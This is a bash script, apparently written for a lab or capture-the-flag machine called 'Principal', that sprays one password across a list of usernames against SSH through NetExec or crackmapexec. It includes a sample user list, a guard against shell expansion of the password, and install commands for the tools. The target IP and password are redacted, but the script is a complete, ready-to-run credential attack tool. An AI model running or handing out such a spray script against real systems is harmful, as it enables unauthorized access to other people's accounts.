#!/usr/bin/env bash
# =============================================================================
# spray.sh — Password spray against SSH on the Principal box.
#
# Uses NetExec (nxc). Falls back to crackmapexec if nxc is unavailable.
#
# Usage:
#     ./spray.sh [TARGET_IP] [USERFILE] [PASSWORD]
#
# Defaults:
#     TARGET_IP  = <TARGET_IP>
#     USERFILE   = user.txt
#     PASSWORD   = <REDACTED_PASSWORD>
#
# ⚠️  QUOTING HAZARD
#     The password contains '$$'. If you pass it on the command line via
#     double quotes, bash will substitute the current PID and the spray
#     will fail for every user. Always single-quote the password, or write
#     it to a file and use `$(cat pwfile)` inside double quotes.
# =============================================================================

set -euo pipefail

TARGET="${1:-<TARGET_IP>}"
USERFILE="${2:-user.txt}"
PASSWORD="${3:-<REDACTED_PASSWORD>}"

# ---------------------------------------------------------------------------
# Prerequisite: user file
# ---------------------------------------------------------------------------
if [[ ! -f "$USERFILE" ]]; then
    cat <<'EOF' >&2
[!] User file not found. Create it first:

    cat > user.txt <<'LIST'
    admin
    svc-deploy
    jthompson
    amorales
    bwright
    kkumar
    mwilson
    lzhang
    LIST
EOF
    exit 1
fi

# ---------------------------------------------------------------------------
# Warn if the password looks like it was PID-substituted by the shell
# (i.e. the caller used double quotes). '$$' becomes a number.
# ---------------------------------------------------------------------------
if [[ ! "$PASSWORD" =~ \$\$ ]]; then
    echo "[!] Warning: password does not contain '\$\$'." >&2
    echo "    It may have been expanded by the shell. Single-quote it:" >&2
    echo "    ./spray.sh <TARGET_IP> user.txt '<PASSWORD>'" >&2
    echo >&2
fi

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
echo "[*] Target:   $TARGET"
echo "[*] Users:    $USERFILE"
echo "[*] Password: (hidden)"
echo "[*] Count:    $(wc -l < "$USERFILE") users"
echo

# ---------------------------------------------------------------------------
# Execute
# ---------------------------------------------------------------------------
if command -v nxc >/dev/null 2>&1; then
    nxc ssh "$TARGET" -u "$USERFILE" -p "$PASSWORD"
elif command -v crackmapexec >/dev/null 2>&1; then
    crackmapexec ssh "$TARGET" -u "$USERFILE" -p "$PASSWORD"
else
    cat <<'EOF' >&2
[!] Neither 'nxc' nor 'crackmapexec' found.

Install with one of:
    sudo apt install -y netexec
    pipx install netexec
EOF
    exit 1
fi

# NOTE : Make it executable:

# chmod +x scripts/spray.sh